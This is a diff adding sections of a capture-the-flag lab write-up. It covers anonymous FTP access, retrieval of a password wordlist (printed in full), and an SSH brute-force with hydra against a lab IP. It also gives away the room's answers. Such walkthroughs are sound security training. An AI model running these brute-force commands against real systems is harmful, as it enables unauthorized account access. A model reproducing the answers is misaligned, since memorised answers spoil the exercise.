@@ -38,3 +38,85 @@ Result:
   ![source](files/source-webpage.png)
 
   But in this case, i found nothing relevant. Only possible usernames to log into ssh.
+
+----
+
+  ## QUESTION 02: Who wrote the task list
+
+  > Well, reading the short excerpt from the website I noticed that there is a character named Ein. It didn't work :(
+
+  But remember, Nmap showed us that there is an FTP server with Anonymous login enabled. So let's see what we found.
+
+  **STEP 01:** log as anonymous on ftp server with this command: `ftp [target]` and type `anonymous` as username.
+
+  In my case:
+
+  ![fpt-login](files/ftp-login.png)
+
+  **STEP 02:** We found two files just running `ls`. Now type `get [file]` to download to your local machine.
+
+  Content of `task.txt`:
+
+  ~~~
+  1.) Protect Vicious.
+  2.) Plan for Red Eye pickup on the moon.
+
+  -lin
+  ~~~
+
+> Oh, maybe lin wrote the task list
+
+Content of `locks.txt`:
+
+~~~
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+~~~
+
+> Strange. Looks like a file with possible passwords.
+
+**With the information obtained so far, you are already able to answer question 02.**
+
+-----
+
+## QUESTION 03: What service can you bruteforce with the text file found?
+
+## QUESTION 04: What is the users password?
+
+Now we have an username, password list and a ssh service. Next step is bruteforce ssh with these credentials. I will use `hydra` but you can use another tool you prefer.
+
+**STEP 01:** Bruteforce ssh with hydra using this command: `hydra -l lin -P locks.txt ssh://target`
+
+ In my case:
+
+ `hydra -l lin -P locks.txt ssh://10.10.81.241`
+
+![hydraresult](files/ssh-bruteforce-hydra.png)
+
+> We found!
+
+**With the information obtained so far, you are already able to answer question 03 and question 04.**
